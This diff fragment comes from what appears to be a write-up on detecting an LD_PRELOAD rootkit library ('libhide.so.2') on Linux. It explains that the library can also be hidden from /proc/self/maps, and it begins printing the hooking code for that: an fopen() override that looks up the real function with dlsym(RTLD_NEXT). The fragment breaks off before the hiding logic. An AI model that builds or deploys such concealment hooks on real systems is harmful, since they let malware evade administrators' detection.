@@ -51,18 +51,7 @@ ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsysca
 As you can see above, clearly libhide.so.2 is being used here. In addition, if we run ls -l /usr/local/lib/, we see that there is nothing listed in that directory
 At least thats what we're being told! Another note, there is a way to hide this entry from cat /proc/self/maps. So, this may not show up if attacker purposely hides it from virtual memory.
 Below is the code needed to hide from cat /proc/self/maps
-```#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <string.h>
-#include <dirent.h>
-#include <dlfcn.h>
-#include <stdarg.h>
-#include <fcntl.h>
-#include <sys/stat.h>
-#include <limits.h>
-
+```
 FILE *fopen(const char *pathname, const char *mode) {
     static FILE* (*orig_fopen)(const char*, const char*) = NULL;
     if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");
